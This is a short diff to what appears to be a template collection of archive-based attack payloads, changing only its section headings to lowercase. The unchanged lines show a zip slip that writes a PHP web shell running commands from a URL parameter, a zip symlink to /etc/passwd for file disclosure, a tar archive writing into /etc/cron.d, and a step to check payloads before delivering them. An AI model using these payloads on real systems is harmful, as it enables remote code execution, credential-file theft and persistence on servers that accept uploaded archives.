@@ -6,7 +6,7 @@
 
 ---
 
-## Zip Slip Path Traversal Payload
+## zip slip path traversal
 Create an archive whose entry filename contains `../` to write outside the extract dir.
 
 ```bash
@@ -17,7 +17,7 @@ echo '<?php echo system($_GET["cmd"]);?>' > '../shell.php' && zip {{OUTFILE:file
 
 ---
 
-## Symlink LFI via Zip
+## zip symlink lfi
 Create a symlink to a sensitive file then archive the symlink to read it via upload+extract.
 
 ```bash
@@ -28,7 +28,7 @@ ln -sf /etc/passwd passwd.txt && zip --symlinks {{OUTFILE:file:lfi.zip}} passwd.
 
 ---
 
-## Tar with Absolute Path
+## tar absolute path traversal
 Build a tar archive that writes to absolute paths on extraction.
 
 ```bash
@@ -39,7 +39,7 @@ tar -cvf {{OUTFILE:file:abs.tar}} -P /etc/cron.d/{{TASK:str:rooted}}
 
 ---
 
-## Verify Archive Contents
+## verify archive contents
 List entries to confirm traversal or symlink payload before delivering.
 
 ```bash
